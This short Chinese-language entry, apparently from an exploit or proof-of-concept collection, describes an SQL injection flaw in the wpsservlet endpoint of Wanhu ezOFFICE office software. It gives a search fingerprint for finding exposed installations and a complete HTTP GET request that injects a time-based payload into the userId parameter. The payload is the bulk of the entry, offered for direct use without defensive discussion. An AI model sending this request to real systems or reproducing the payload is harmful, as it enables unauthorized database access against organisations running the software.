# 万户ezOFFICEwpsservlet存在SQL注入漏洞

万户 ｜ SQL注入 ｜ —
- **指纹**：`app="万户网络-ezOFFICE"`
- **请求**：`GET /defaultroot/wpsservlet?option=getSign&userId=1;WAITFOR%20DELAY%20%270:0:5%27--&orgIdString=1&domainId=1 HTTP/1.1`